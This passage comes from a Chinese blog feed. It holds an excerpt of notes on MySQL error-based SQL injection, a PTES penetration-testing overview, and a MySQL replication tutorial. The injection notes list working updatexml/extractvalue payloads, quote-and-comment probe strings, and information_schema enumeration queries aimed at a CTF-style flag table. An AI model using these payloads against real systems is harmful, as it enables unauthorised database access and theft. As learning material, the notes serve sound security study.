punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">SELECT</span> @<span class="token variable">@version</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span>?id<span class="token operator">=</span>updatexml<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">SELECT</span> @<span class="token variable">@version</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span>?id<span class="token operator">=</span>updatexml<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span>SUBSTR<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">SELECT</span> @<span class="token variable">@version</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">24</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><blockquote><p>[0x7e 实际是是 16 进制，Mysql 支持 16 进制，但是开头得写 0x 0x7e 是一个特殊符号，然后不符合路径规则报错] ~ ~</p></blockquote><p>​</p><p>另外，updatexml 最多只能显示 32 位，需要配合 SUBSTR 使用。</p><pre class="line-numbers language-sql"><code class="language-sql">updatexml<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span>SUBSTR<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">SELECT</span> f14g <span class="token keyword">from</span> f14g <span class="token keyword">LIMIT</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">24</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span>updatexml<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> substring<span class="token punctuation">(</span>f14g<span class="token punctuation">,</span><span class="token number">20</span><span class="token punctuation">)</span> <span class="token keyword">from</span> f14g <span class="token keyword">limit</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span>extractvalue<span class="token punctuation">(</span><span class="token number">0x0a</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x0a</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="二、试探性-payloads"><a href="#二、试探性-payloads" class="headerlink" title="二、试探性 payloads"></a>二、试探性 payloads</h2><p>记得可以试试带上注释”#”或”– “，注意注释符是含空格的。</p><pre><code>id=1' #id=' #id=-1' #id=' --+id=%5c --+id=' --+id=" --+id== --+id=-1 --+id=-0 --+id=3-2 --+</code></pre><p>后期 payload</p><pre class="line-numbers language-sql"><code class="language-sql"><span class="token number">1</span> <span class="token operator">&amp;&amp;</span> extractvalue<span class="token punctuation">(</span><span class="token number">0x0a</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x0a</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#</span><span class="token number">1</span> <span class="token operator">&amp;&amp;</span> extractvalue<span class="token punctuation">(</span><span class="token number">0x0a</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x0a</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> table_name <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">limit</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#</span><span class="token number">1</span> <span class="token operator">&amp;&amp;</span> extractvalue<span class="token punctuation">(</span><span class="token number">0x0a</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x0a</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> column_name <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">columns</span> <span class="token keyword">limit</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#</span><span class="token number">1</span> <span class="token operator">&amp;&amp;</span> extractvalue<span class="token punctuation">(</span><span class="token number">0x0a</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x0a</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> substr<span class="token punctuation">(</span>f14g<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">32</span><span class="token punctuation">)</span> <span class="token keyword">from</span> f14g<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#</span><span class="token number">1</span> <span class="token operator">&amp;&amp;</span> extractvalue<span class="token punctuation">(</span><span class="token number">0x0a</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x0a</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> substr<span class="token punctuation">(</span>f14g<span class="token punctuation">,</span><span class="token number">15</span><span class="token punctuation">,</span><span class="token number">32</span><span class="token punctuation">)</span> <span class="token keyword">from</span> f14g<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="三、MySQL-信息收集"><a href="#三、MySQL-信息收集" class="headerlink" title="三、MySQL 信息收集"></a>三、MySQL 信息收集</h2><p>注入 payload 参考指南 <a href="http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet">MySQL SQL Injection Cheat Sheet</a><br>注意 WHERE 的限制即可以用=也可以用 LIKE</p><pre class="line-numbers language-sql"><code class="language-sql"><span class="token comment" spellcheck="true"># MySQL版本</span><span class="token keyword">SELECT</span> @<span class="token variable">@version</span><span class="token comment" spellcheck="true"># 用户</span><span class="token keyword">SELECT</span> <span class="token keyword">user</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 数据库</span><span class="token keyword">SELECT</span> <span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 表名</span><span class="token keyword">SELECT</span> table_name <span class="token keyword">FROM</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">LIMIT</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token keyword">SELECT</span> table_name <span class="token keyword">FROM</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">WHERE</span> table_schema<span class="token operator">=</span><span class="token string">"words"</span> <span class="token keyword">LIMIT</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token keyword">SELECT</span> table_name <span class="token keyword">FROM</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">WHERE</span> table_schema <span class="token operator">LIKE</span> <span class="token string">"%words%"</span> <span class="token keyword">LIMIT</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token keyword">SELECT</span> table_name <span class="token keyword">FROM</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">LIMIT</span> <span class="token number">81</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token comment" spellcheck="true"># 列名</span><span class="token keyword">SELECT</span> column_name <span class="token keyword">FROM</span> information_schema<span class="token punctuation">.</span><span class="token keyword">columns</span> <span class="token keyword">WHERE</span> table_name<span class="token operator">=</span><span class="token string">"f14g"</span> <span class="token keyword">LIMIT</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token keyword">SELECT</span> column_name <span class="token keyword">FROM</span> information_schema<span class="token punctuation">.</span><span class="token keyword">columns</span> <span class="token keyword">WHERE</span> table_name <span class="token operator">LIKE</span> <span class="token string">"f14g"</span> <span class="token keyword">LIMIT</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token keyword">SELECT</span> column_name <span class="token keyword">FROM</span> information_schema<span class="token punctuation">.</span><span class="token keyword">columns</span> <span class="token keyword">LIMIT</span> <span class="token number">808</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token comment" spellcheck="true"># 查数据</span><span class="token keyword">SELECT</span> f14g <span class="token keyword">from</span> f14g <span class="token keyword">LIMIT</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token comment" spellcheck="true"># 关键payload</span>updatexml<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span>SUBSTR<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">SELECT</span> f14g <span class="token keyword">from</span> f14g <span class="token keyword">LIMIT</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">24</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL注入 </tag>
            
            <tag> 报错注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PTES渗透测试执行标准</title>
      <link href="/post/f018521c.html"/>
      <url>/post/f018521c.html</url>
      
        <content type="html"><![CDATA[<h1 id="PTES-渗透测试执行标准"><a href="#PTES-渗透测试执行标准" class="headerlink" title="PTES 渗透测试执行标准"></a>PTES 渗透测试执行标准</h1><p><img src="https://cdn.nlark.com/yuque/0/2021/png/519483/1632151033454-6765fe47-d2fb-454b-9632-66ba10e2cfb0.png?x-oss-process=image/watermark,type_d3F5LW1pY3JvaGVp,size_34,text_VHJ1ZGE=,color_FFFFFF,shadow_50,t_80,g_se,x_10,y_10#clientId=u2b075871-70aa-4&amp;from=paste&amp;height=432&amp;id=u991fdaae&amp;margin=%5Bobject%20Object%5D&amp;name=PTES.png&amp;originHeight=864&amp;originWidth=1200&amp;originalType=binary%E2%88%B6=1&amp;size=117867&amp;status=done&amp;style=none&amp;taskId=u34deafb5-320a-41a8-8fea-7e89c597095&amp;width=600" alt="PTES.png"></p><h2 id="一、前期交互阶段"><a href="#一、前期交互阶段" class="headerlink" title="一、前期交互阶段"></a>一、前期交互阶段</h2><p>在前期交互（Pre-Engagement Interaction）阶段，渗透测试团队与客户组织进行交互讨论，最重要的是确定渗透测试的范围、目标、限制条件以及服务合同细节。<br>该阶段通常涉及收集客户需求、准备测试计划、定义测试范围与边界、定义业务目标、项目管理与规划等活动。<br>​</p><h2 id="二、情报收集阶段"><a href="#二、情报收集阶段" class="headerlink" title="二、情报收集阶段"></a>二、情报收集阶段</h2><p>在目标范围确定之后，将进入情报搜集（Information Gathering）阶段，渗透测试团队可以利用各种信息来源与搜集技术方法，尝试获取更多关于目标组织网络拓扑、系统配置 与安全防御措施的信息。<br>渗透测试者可以使用的情报搜集方法包括公开来源信息查询、Google Hacking、社会工程学、网络踩点、扫描探测、被动监听、服务查点等。而对目标系统的情报探查能力是渗透测试者一项非常重要的技能，情报搜集是否充分在很大程度上决定了渗透测试的成败，因为如果你遗漏关键的情报信息，你将可能在后面的阶段里一无所获。</p><h2 id="三、威胁建模阶段"><a href="#三、威胁建模阶段" class="headerlink" title="三、威胁建模阶段"></a>三、威胁建模阶段</h2><p>在搜集到充分的情报信息之后，渗透测试团队的成员们停下敲击键盘，大家聚到一起针对获取的信息进行威胁建模（Threat Modeling）与攻击规划。这是渗透测试过程中非常重要，但很容易被忽视的一个关键点。<br>通过团队共同的缜密情报分析与攻击思路头脑风暴，可以从大量的信息情报中理清头绪，确定出最可行的攻击通道。</p><h2 id="四、漏洞分析阶段"><a href="#四、漏洞分析阶段" class="headerlink" title="四、漏洞分析阶段"></a>四、漏洞分析阶段</h2><p>在确定出最可行的攻击通道之后，接下来需要考虑该如何取得目标系统的访问控制权，即漏洞分析（Vulnerability Analysis）阶段。<br>在该阶段，渗透测试者需要综合分析前几个阶段获取并汇总的情报信息，特别是安全漏洞扫描结果、服务查点信息等，通过搜索可获取的渗透代码资源，找出可以实施渗透攻击的攻击点，并在实验环境中进行验证。在该阶段，高水平的渗透测试团队还会针对攻击通道上的一些关键系统与服务进行安全漏洞探测与挖掘，期望找出可被利用的未知安全漏洞，并开发出渗透代码，从而打开攻击通道上的关键路径。</p><h2 id="五、渗透攻击阶段"><a href="#五、渗透攻击阶段" class="headerlink" title="五、渗透攻击阶段"></a>五、渗透攻击阶段</h2><p>渗透攻击（Exploitation）是渗透测试过程中最具有魅力的环节。在此环节中，渗透测试团队需要利用他们所找出的目标系统安全漏洞，来真正入侵系统当中，获得访问控制权。<br>渗透攻击可以利用公开渠道可获取的渗透代码，但一般在实际应用场景中，渗透测试者还需要充分地考虑目标系统特性来定制渗透攻击，并需要挫败目标网络与系统中实施的安全防御措施，才能成功达成渗透目的。在黑盒测试中，渗透测试者还需要考虑对目标系统检测机制的逃逸，从而避免造成目标组织安全响应团队的警觉和发现。<br>​</p><h2 id="六、后渗透攻击阶段"><a href="#六、后渗透攻击阶段" class="headerlink" title="六、后渗透攻击阶段"></a>六、后渗透攻击阶段</h2><p>后渗透攻击（Post Exploitation）是整个渗透测试过程中最能够体现渗透测试团队创造力与技术能力的环节。前面的环节可以说都是在按部就班地完成非常普遍的目标，而在这个环节中，需要渗透测试团队根据目标组织的业务经营模式、保护资产形式与安全防御计划的不同特点，自主设计出攻击目标，识别关键基础设施，并寻找客户组织最具价值和尝试安全保护的信息和资产，最终达成能够对客户组织造成最重要业务影响的攻击途径。<br>在不同的渗透测试场景中，这些攻击目标与途径可能是千变万化的，而设置是否准确并且可行，也取决于团队自身的创新意识、知识范畴、实际经验和技术能力。<br>​</p><h2 id="七、报告阶段"><a href="#七、报告阶段" class="headerlink" title="七、报告阶段"></a>七、报告阶段</h2><p>渗透测试过程最终向客户组织提交，取得认可并成功获得合同付款的就是一份渗透测试报告（Reporting）。这份报告凝聚了之前所有阶段之中渗透测试团队所获取的关键情报信息、探测和发掘出的系统安全漏洞、成功渗透攻击的过程，以及造成业务影响后果的攻击途径，同时还要站在防御者的角度上，帮助他们分析安全防御体系中的薄弱环节、存在的问题，以及修补与升级技术方案。<br>​</p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PTES </tag>
            
            <tag> 渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Mysql 主从配置</title>
      <link href="/post/14b661.html"/>
      <url>/post/14b661.html</url>
      
        <content type="html"><![CDATA[<h1 id="Mysql-主从配置"><a href="#Mysql-主从配置" class="headerlink" title="Mysql 主从配置"></a>Mysql 主从配置</h1><h2 id="一、介绍"><a href="#一、介绍" class="headerlink" title="一、介绍"></a>一、介绍</h2><p>MySQL 主从又叫做 Replication、AB 复制。简单讲就是 A 和 B 两台机器做主从后，在 A 上写数据，另外一台 B 也会跟着写数据，两者数据实时同步的 MySQL 主从是基于 binlog 的，主上须开启 binlog 才能进行主从。<br>​</p><p>主从过程大致有 3 个步骤：</p><p>1.<strong>Master</strong>将更改操作记录到<strong>binlog</strong>里<br>1.<strong>Slave</strong>将<strong>Master</strong>的<strong>binlog</strong>事件(sql 语句)同步到从本机上并记录在<strong>relaylog</strong>里<br>1.<strong>Slave</strong>根据<strong>relaylog</strong>里面的<strong>sql 语句</strong>按顺序执行，<strong>Master</strong>上有一个<strong>log dump</strong>线程，用来和<strong>Slave</strong>的<strong>I/O</strong>线程传递<strong>binlog</strong>，<strong>Slave</strong>上有两个线程，其中 I/O 线程用来同步<strong>Master</strong>的<strong>binlog</strong>并生成<strong>relaylog</strong>，另外一个<strong>SQL</strong>线程用来把<strong>relaylog</strong>里面的<strong>sql</strong>语句落地</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/519483/1629287574688-93c1ad1c-188f-4a89-b074-45fb814a8da9.png#clientId=u22899781-ab06-4&amp;from=paste&amp;height=353&amp;id=u38698608&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=353&amp;originWidth=649&amp;originalType=binary%E2%88%B6=1&amp;size=40310&amp;status=done&amp;style=none&amp;taskId=u8da928dd-50f8-4e0b-b146-98ad264798c&amp;width=649" alt="image.png"></p><p>它的一般应用场景有</p><ul><li>数据的备份</li><li>读写分离</li></ul><p>​</p><h2 id="二、mysql-主从搭建"><a href="#二、mysql-主从搭建" class="headerlink" title="二、mysql 主从搭建"></a>二、mysql 主从搭建</h2><h3 id="服务器准备"><a href="#服务器准备" class="headerlink" title="服务器准备"></a>服务器准备</h3><table><thead><tr><th>作用</th><th>IP</th><th>数据库</th></tr></thead><tbody><tr><td>Master</td><td>192.168.2.8</td><td>MySQL 5.7</td></tr><tr><td>Slave</td><td>192.168.2.9</td><td>MySQL 5.7</td></tr></tbody></table><h3 id="检查-UUID"><a href="#检查-UUID" class="headerlink" title="检查 UUID"></a>检查 UUID</h3><p><strong>Master</strong>和<strong>Slave</strong>必须具有不同的<strong>UUID</strong>，才能实现主从同步。<br>查看 <strong>UUID</strong>：<code>cat /var/lib/mysql/auto.cnf</code><br>如果<strong>UUID</strong>相同则必须先修改<strong>UUID</strong>然后<strong>重启</strong>​<strong>MySQL</strong>。<br>​</p><h3 id="配置-Master"><a href="#配置-Master" class="headerlink" title="配置 Master"></a>配置 Master</h3><p>修改配置文件 <code>vim /etc/my.cnf</code></p><pre class="line-numbers language-bash"><code class="language-bash">server-id <span class="token operator">=</span> 1     <span class="token comment" spellcheck="true"># 与 slave 的不相等</span>log-bin<span class="token operator">=</span>mysqlbin  <span class="token comment" spellcheck="true"># 开启二进制日志功能，可以随便取</span>binlog-do-db<span class="token operator">=</span>db1  <span class="token comment" spellcheck="true"># 针对某个数据库同步，用“,”隔开多个数据库，或者binlog-ignore-db=mysql #指定库不同步</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>重启服务</p><pre class="line-numbers language-bash"><code class="language-bash">systemctl restart mysqld<span class="token comment" spellcheck="true"># OR</span><span class="token function">service</span> mysqld restart<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>登录 <strong>Master</strong> 数据库进行配置</p><ol><li>配置 Slave</li></ol><pre class="line-numbers language-sql"><code class="language-sql"><span class="token keyword">grant</span> <span class="token keyword">replication</span> slave <span class="token keyword">on</span> <span class="token operator">*</span><span class="token punctuation">.</span><span class="token operator">*</span> <span class="token keyword">to</span> <span class="token string">'repl'</span>@'<span class="token number">192.168</span><span class="token punctuation">.</span><span class="token number">2.9</span><span class="token string">' identified by '</span><span class="token number">123456</span>'<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="2"><li>开启读锁，从主上配置结束后要解锁</li></ol><pre class="line-numbers language-sql"><code class="language-sql">flush <span class="token keyword">tables</span> <span class="token keyword">with</span> <span class="token keyword">read</span> <span class="token keyword">lock</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="3"><li>查看 Master 信息</li></ol><pre class="line-numbers language-sql"><code class="language-sql"><span class="token keyword">show</span> master <span class="token keyword">status</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>​</p><p>完整执行过程如下：</p><pre class="line-numbers language-bash"><code class="language-bash">root:<span class="token punctuation">(</span>none<span class="token punctuation">)</span><span class="token operator">></span> grant replication slave on *.* to <span class="token string">'repl'</span>@<span class="token string">'192.168.2.9'</span> identified by <span class="token string">'123456'</span><span class="token punctuation">;</span>Query OK, 0 rows affectedTime: 0.003sroot:<span class="token punctuation">(</span>none<span class="token punctuation">)</span><span class="token operator">></span> flush tables with <span class="token function">read</span> lock<span class="token punctuation">;</span>Query OK, 0 rows affectedTime: 0.002sroot:<span class="token punctuation">(</span>none<span class="token punctuation">)</span><span class="token operator">></span> show master status<span class="token punctuation">;</span>+-----------------+----------+--------------+------------------+-------------------+<span class="token operator">|</span> File            <span class="token operator">|</span> Position <span class="token operator">|</span> Binlog_Do_DB <span class="token operator">|</span> Binlog_Ignore_DB <span class="token operator">|</span> Executed_Gtid_Set <span class="token operator">|</span>+-----------------+----------+--------------+------------------+-------------------+<span class="token operator">|</span> mysqlbin.000001 <span class="token operator">|</span> 447      <span class="token operator">|</span> db1          <span class="token operator">|</span>                  <span class="token operator">|</span>                   <span class="token operator">|</span>+-----------------+----------+--------------+------------------+-------------------+1 row <span class="token keyword">in</span> <span class="token keyword">set</span>Time: 0.010s<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="配置-Slave"><a href="#配置-Slave" class="headerlink" title="配置 Slave"></a>配置 Slave</h3><p>修改配置文件 <code>vim /etc/my.cnf</code></p><pre class="line-numbers language-bash"><code class="language-bash">server-id<span class="token operator">=</span>2         <span class="token comment" spellcheck="true"># 与 master 的不相等</span>relay_log<span class="token operator">=</span>relaybin  <span class="token comment" spellcheck="true"># 配置中继日志</span>binlog-do-db<span class="token operator">=</span>db1    <span class="token comment" spellcheck="true"># 针对某个数据库同步，用“,”隔开多个数据库，或者binlog-ignore-db=mysql #指定库不同步</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>重启服务</p><pre class="line-numbers language-bash"><code class="language-bash">systemctl restart mysqld<span class="token comment" spellcheck="true"># OR</span><span class="token function">service</span> mysqld restart<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>登录 <strong>Slave</strong> 数据库进行配置</p><ol><li>先停止主从</li></ol><pre class="line-numbers language-sql"><code class="language-sql">stop slave<span class="token punctuation">;</span><span class="token comment" spellcheck="true">// OR</span>slave stop<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><ol start="2"><li>关键一步，根据 <strong>Master</strong> 上 <code>show master status</code> 显示的信息进行配置<ol><li>master_host ：Master 的地址</li><li>master_port：Master 的端口号</li><li>master_user：用于数据同步的用户</li><li>master_password：用于同步的用户的密码</li><li>master_log_file：指定 Slave 从哪个日志文件开始复制数据</li><li>master_log_pos：从哪个 Position 开始读 ​</li></ol></li></ol><pre class="line-numbers language-sql"><code class="language-sql">change master <span class="token keyword">to</span> master_host<span class="token operator">=</span><span class="token string">'192.168.2.8'</span><span class="token punctuation">,</span>master_port<span class="token operator">=</span><span class="token number">3306</span><span class="token punctuation">,</span>master_user<span class="token operator">=</span><span class="token string">'repl'</span><span class="token punctuation">,</span>master_password<span class="token operator">=</span><span class="token string">'123456'</span><span class="token punctuation">,</span>master_log_file<span class="token operator">=</span><span class="token string">'mysqlbin.000001'</span><span class="token punctuation">,</span>master_log_pos<span class="token operator">=</span><span class="token number">447</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="3"><li>开启 Slave</li></ol><pre class="line-numbers language-sql"><code class="language-sql"><span class="token keyword">start</span> slave<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="4"><li>查看 Slave 状态</li></ol><pre class="line-numbers language-sql"><code class="language-sql"><span class="token keyword">show</span> slave <span class="token keyword">status</span>\G<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>两个 yes 表示成功<br>…<br>Slave_IO_Running: Yes<br>Slave_SQL_Running: Yes<br>…</p></blockquote><p>完整执行过程如下：</p><pre class="line-numbers language-sql"><code class="language-sql">root:<span class="token punctuation">(</span>none<span class="token punctuation">)</span><span class="token operator">></span> stop slave<span class="token punctuation">;</span>Query OK<span class="token punctuation">,</span> <span class="token number">0</span> <span class="token keyword">rows</span> affectedTime: <span class="token number">0</span><span class="token punctuation">.</span>002sroot:<span class="token punctuation">(</span>none<span class="token punctuation">)</span><span class="token operator">></span> change master <span class="token keyword">to</span> master_host<span class="token operator">=</span><span class="token string">'192.168.2.8'</span><span class="token punctuation">,</span> master_user<span class="token operator">=</span><span class="token string">'repl'</span><span class="token punctuation">,</span> master_password<span class="token operator">=</span><span class="token string">'123456'</span>          <span class="token operator">-</span><span class="token operator">></span> <span class="token punctuation">,</span> master_port<span class="token operator">=</span><span class="token number">3306</span><span class="token punctuation">,</span> master_log_file<span class="token operator">=</span><span class="token string">'mysqlbin.000001'</span><span class="token punctuation">,</span> master_log_pos<span class="token operator">=</span><span class="token number">447</span><span class="token punctuation">;</span>Query OK<span class="token punctuation">,</span> <span class="token number">0</span> <span class="token keyword">rows</span> affectedTime: <span class="token number">0</span><span class="token punctuation">.</span>006sroot:<span class="token punctuation">(</span>none<span class="token punctuation">)</span><span class="token operator">></span> <span class="token keyword">start</span> slave<span class="token punctuation">;</span>Query OK<span class="token punctuation">,</span> <span class="token number">0</span> <span class="token keyword">rows</span> affectedTime: <span class="token number">0</span><span class="token punctuation">.</span>003sroot:<span class="token punctuation">(</span>none<span class="token punctuation">)</span><span class="token operator">></span> <span class="token keyword">show</span> slave <span class="token keyword">status</span> \G<span class="token punctuation">;</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">[</span> <span class="token number">1</span><span class="token punctuation">.</span> <span class="token keyword">row</span> <span class="token punctuation">]</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span>Slave_IO_State                <span class="token operator">|</span>Master_Host                   <span class="token operator">|</span> <span class="token number">192.168</span><span class="token punctuation">.</span><span class="token number">2.8</span>Master_User                   <span class="token operator">|</span> replMaster_Port                   <span class="token operator">|</span> <span class="token number">3306</span>Connect_Retry                 <span class="token operator">|</span> <span class="token number">30</span>Master_Log_File               <span class="token operator">|</span> mysqlbin<span class="token number">.000001</span>Read_Master_Log_Pos           <span class="token operator">|</span> <span class="token number">447</span>Relay_Log_File                <span class="token operator">|</span> relaybin<span class="token number">.000001</span>Relay_Log_Pos                 <span class="token operator">|</span> <span class="token number">4</span>Relay_Master_Log_File         <span class="token operator">|</span> mysqlbin<span class="token number">.000001</span>Slave_IO_Running              <span class="token operator">|</span> YesSlave_SQL_Running             <span class="token operator">|</span> YesReplicate_Do_DB               <span class="token operator">|</span>Replicate_Ignore_DB           <span class="token operator">|</span>Replicate_Do_Table            <span class="token operator">|</span>Replicate_Ignore_Table        <span class="token operator">|</span>Replicate_Wild_Do_Table       <span class="token operator">|</span>Replicate_Wild_Ignore_Table   <span class="token operator">|</span>Last_Errno                    <span class="token operator">|</span> <span class="token number">0</span>Last_Error                    <span class="token operator">|</span>Skip_Counter                  <span class="token 